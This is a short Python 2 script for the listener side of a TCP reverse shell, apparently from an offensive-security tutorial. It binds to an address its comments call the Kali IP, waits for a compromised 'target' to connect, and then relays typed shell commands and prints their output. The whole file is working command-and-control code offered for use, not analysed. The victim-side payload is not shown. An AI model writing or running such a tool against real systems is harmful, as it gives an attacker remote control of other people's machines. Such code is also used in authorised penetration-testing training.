
import socket   


def connect():
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    # start a socket object 's'
    
    s.bind(("10.10.10.100", 8080))                           # define the kali IP and the listening port
    
    s.listen(1)                                             # define the backlog size, since we are expecting a single connection from a single
                                                            
    
    print '[+] Listening for incoming TCP connection on port 8080'
    
    conn, addr = s.accept()     
    
    print '[+] We got a connection from: ', addr


    while True:
        
        command = raw_input("Shell> ")   # Get user input and store it in command variable
        
        if 'terminate' in command:       # If we got terminate command, inform the client and close the connect and break the loop
            conn.send('terminate')
            conn.close()
            break

        else:
            conn.send(command)    # Otherwise we will send the command to the target
            print conn.recv(1024) # and print the result that we got back
        
def main ():
    connect()
main()
